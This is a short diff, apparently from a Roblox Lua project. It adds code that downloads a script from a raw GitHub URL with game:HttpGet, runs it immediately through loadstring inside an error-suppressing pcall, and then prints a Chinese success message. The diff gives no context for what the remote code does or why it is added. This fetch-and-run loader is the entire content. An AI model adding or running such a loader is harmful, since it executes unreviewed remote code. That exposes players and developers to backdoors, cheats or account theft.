@@ -1,0 +1,4 @@
+ pcall(function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/smalldesikon/hun/9b7696b265f19301425415ee1fc5772ddb2f6edd/hunka"))()
+     print("✅ 执行成功")
+ end)
